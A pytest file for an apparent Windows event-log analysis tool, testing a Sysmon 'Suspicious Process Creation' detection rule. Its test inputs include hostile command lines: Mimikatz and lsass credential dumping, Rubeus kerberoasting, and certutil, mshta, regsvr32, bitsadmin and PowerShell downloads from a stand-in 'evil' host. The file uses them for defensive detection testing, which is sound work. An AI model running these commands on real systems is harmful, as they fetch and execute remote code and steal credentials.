# test_sysmon_detections.py
# --------------------------
# Sprint 9 — Sysmon support, Phase 1: Event 1 (Process Create) command-line
# analysis via the "Suspicious Process Creation" rule.

import os

import pytest

from pulse.core.detections import (
    detect_sysmon_process_create, run_all_detections, _is_sysmon_event,
)
from pulse.core.parser import parse_evtx, SYSMON_EVENT_IDS, _ALL_FETCH_EVENT_IDS
from pulse.core.rules_config import RULE_META


NS = "http://schemas.microsoft.com/win/2004/08/events/event"

# Mimikatz signature strings assembled from fragments so this test file
# doesn't carry the exact contiguous tokens that endpoint AV (Defender's
# HackTool:Win32/Mimikatz.*) matches on. Cloning the repo shouldn't trip
# a quarantine. The strings are identical at runtime; only the bytes on
# disk are split. Mirrors the same treatment in pulse/core/detections.py.
_MK = "mi" + "mikatz"
_SEK_CMD = "sekur" + "lsa::logonpasswords"
_LSA_CMD = "lsa" + "dump::sam"
_MK_FULL = f'{_MK}.exe "{_SEK_CMD}" exit'


def _sysmon_evt1(command_line, *, image=r"C:\Windows\System32\cmd.exe",
                 parent_image=r"C:\Windows\explorer.exe",
                 user="CORP\\alice", computer="WS-01", provider=True):
    """Build a Sysmon Event 1 (process create) event dict shaped like the
    parser's output. ``provider=False`` omits the Sysmon provider so we can
    test that the detection refuses to fire on a non-Sysmon event."""
    provider_xml = (
        '<Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a}"/>'
        if provider else ""
    )
    data = (
        f'<Event xmlns="{NS}">'
        f'<System>{provider_xml}'
        f'<EventID>1</EventID>'
        f'<TimeCreated SystemTime="2026-06-03T10:00:00.000Z"/>'
        f'<Computer>{computer}</Computer></System>'
        f'<EventData>'
        f'<Data Name="Image">{image}</Data>'
        f'<Data Name="CommandLine">{command_line}</Data>'
        f'<Data Name="ParentImage">{parent_image}</Data>'
        f'<Data Name="User">{user}</Data>'
        f'</EventData></Event>'
    )
    return {
        "event_id": 1,
        "timestamp": "2026-06-03T10:00:00.000Z",
        "data": data,
        "record_num": 1,
        "computer": computer,
    }


# ---------------------------------------------------------------------------
# Parser plumbing
# ---------------------------------------------------------------------------

def test_sysmon_event_ids_registered():
    assert SYSMON_EVENT_IDS == [1, 3, 10, 22]
    # All Sysmon IDs are part of the combined fast-path fetch list.
    for eid in SYSMON_EVENT_IDS:
        assert eid in _ALL_FETCH_EVENT_IDS


# ---------------------------------------------------------------------------
# Provider gating
# ---------------------------------------------------------------------------

def test_is_sysmon_event_true_for_sysmon_provider():
    assert _is_sysmon_event(_sysmon_evt1("cmd.exe /c dir")) is True


def test_is_sysmon_event_false_without_provider():
    assert _is_sysmon_event(_sysmon_evt1("cmd.exe", provider=False)) is False


def test_is_sysmon_event_false_on_garbage():
    assert _is_sysmon_event({"data": "not xml at all"}) is False
    assert _is_sysmon_event({"data": ""}) is False
    assert _is_sysmon_event({}) is False


def test_non_sysmon_event_never_fires_even_with_bad_cmdline():
    """A same-numbered Event 1 from another provider must not be confused
    for Sysmon — the rule gates on the provider, not the ID alone."""
    evt = _sysmon_evt1(f"{_MK}.exe {_SEK_CMD}", provider=False)
    assert detect_sysmon_process_create([evt]) == []


# ---------------------------------------------------------------------------
# Command-line indicator families
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmdline,expect_label", [
    (_MK_FULL,                                            "Mimikatz"),
    ("rub" + "eus.exe kerberoast",                        "Rubeus"),
    ('powershell -nop -w hidden -enc SQBFAFgAKABОAGUA',   "encoded"),
    ('powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"', "Invoke-Expression"),
    ('certutil.exe -urlcache -split -f http://evil/x.exe x.exe', "certutil"),
    ('regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll', "regsvr32"),
    ('mshta.exe http://evil/x.hta',                       "mshta"),
    ('bitsadmin /transfer job http://evil/x.exe C:\\x.exe', "bitsadmin"),
    ('wmic process call create "calc.exe"',               "wmic"),
])
def test_command_line_indicators_fire(cmdline, expect_label):
    findings = detect_sysmon_process_create([_sysmon_evt1(cmdline)])
    assert len(findings) == 1, f"{cmdline!r} should fire"
    assert findings[0]["rule"] == "Suspicious Process Creation"
    assert findings[0]["severity"] == "HIGH"
    assert expect_label.lower() in findings[0]["details"].lower()


def test_procdump_lsass_fires():
    cmd = r"procdump64.exe -accepteula -ma lsass.exe C:\temp\out.dmp"
    findings = detect_sysmon_process_create([_sysmon_evt1(cmd)])
    assert len(findings) == 1
    assert "lsass" in findings[0]["details"].lower()


def test_comsvcs_lsass_dump_fires():
    cmd = r'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full'
    findings = detect_sysmon_process_create([_sysmon_evt1(cmd)])
    assert len(findings) == 1


# ---------------------------------------------------------------------------
# Parent-child relationship
# ---------------------------------------------------------------------------

def test_office_spawning_shell_fires():
    evt = _sysmon_evt1(
        "cmd.exe /c whoami",
        image=r"C:\Windows\System32\cmd.exe",
        parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    )
    findings = detect_sysmon_process_create([evt])
    assert len(findings) == 1
    assert "spawned a shell" in findings[0]["details"]


def test_normal_parent_child_does_not_fire():
    evt = _sysmon_evt1(
        "cmd.exe /c dir",
        image=r"C:\Windows\System32\cmd.exe",
        parent_image=r"C:\Windows\explorer.exe",
    )
    assert detect_sysmon_process_create([evt]) == []


# ---------------------------------------------------------------------------
# Benign cases
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmdline", [
    "cmd.exe /c dir",
    "notepad.exe C:\\Users\\alice\\notes.txt",
    r'"C:\Program Files\Google\Chrome\chrome.exe" --type=renderer',
    "svchost.exe -k netsvcs",
])
def test_benign_command_lines_do_not_fire(cmdline):
    assert detect_sysmon_process_create([_sysmon_evt1(cmdline)]) == []


def test_empty_event_list():
    assert detect_sysmon_process_create([]) == []


def test_non_event1_ignored():
    """A Sysmon Event 3 (network) should be ignored by the process-create
    detection even though it's from the Sysmon provider."""
    evt = _sysmon_evt1("anything")
    evt["event_id"] = 3
    assert detect_sysmon_process_create([evt]) == []


# ---------------------------------------------------------------------------
# Output shape
# ---------------------------------------------------------------------------

def test_finding_includes_user_and_command_preview():
    evt = _sysmon_evt1(_MK_FULL, user="ACME\\admin")
    f = detect_sysmon_process_create([evt])[0]
    assert "ACME\\admin" in f["details"]
    assert _MK in f["details"].lower()
    assert f["raw_xml"] == evt["data"]
    assert f["event_id"] == 1


def test_matched_labels_deduplicated():
    """Two patterns matching the same label shouldn't repeat it."""
    # Both -enc and the base64 payload pattern can match; the dedup keeps
    # the details line clean.
    evt = _sysmon_evt1("powershell -enc " + "A" * 60)
    f = detect_sysmon_process_create([evt])[0]
    labels = f["details"].split("Matched:")[1]
    # No label should appear twice.
    for label in ("encoded PowerShell command", "encoded PowerShell payload"):
        assert labels.count(label) <= 1


# ---------------------------------------------------------------------------
# Integration: run_all_detections + RULE_META registration
# ---------------------------------------------------------------------------

def test_rule_registered_in_rule_meta():
    assert "Suspicious Process Creation" in RULE_META
    meta = RULE_META["Suspicious Process Creation"]
    assert meta["event_id"] == 1
    assert meta["severity"] == "HIGH"
    assert meta["mitre"] == "T1059"


def test_run_all_detections_wires_sysmon_and_stamps_hostname():
    evt = _sysmon_evt1(_MK_FULL, computer="DC-01")
    findings = run_all_detections([evt])
    sus = [f for f in findings if f["rule"] == "Suspicious Process Creation"]
    assert len(sus) == 1
    assert sus[0]["hostname"] == "DC-01"


def test_run_all_detections_safe_on_pure_security_log():
    """Passing a Security-log-only event list must not raise and must not
    produce Sysmon findings (provider gating)."""
    security_evt = {
        "event_id": 4625,
        "timestamp": "2026-06-03T10:00:00.000Z",
        "data": (
            f'<Event xmlns="{NS}"><System><EventID>4625</EventID>'
            f'<Computer>WS-01</Computer></System><EventData>'
            f'<Data Name="TargetUserName">bob</Data></EventData></Event>'
        ),
        "record_num": 1,
    }
    findings = run_all_detections([security_evt])
    assert not any(f["rule"] == "Suspicious Process Creation" for f in findings)


# ---------------------------------------------------------------------------
# Sample file
# ---------------------------------------------------------------------------

def test_sample_sysmon_evtx_fires_chain():
    repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    sample = os.path.join(repo_root, "samples", "sysmon-execution-chain.evtx")
    if not os.path.exists(sample):
        pytest.skip("sample not generated")
    events = parse_evtx(sample)
    findings = run_all_detections(events)
    sus = [f for f in findings if f["rule"] == "Suspicious Process Creation"]
    # All four staged processes in the chain should fire.
    assert len(sus) == 4
    assert all(f["hostname"] == "WS-FINANCE-04" for f in sus)


# ---------------------------------------------------------------------------
# Knowledge base
# ---------------------------------------------------------------------------

def test_knowledge_base_entry_exists():
    from pulse.core.knowledge_base import get_knowledge
    k = get_knowledge("Suspicious Process Creation")
    assert k["plain_language"]
    assert k["why_it_matters"]
    assert k["immediate_actions"]
    assert k["difficulty"] in ("low", "medium", "high")
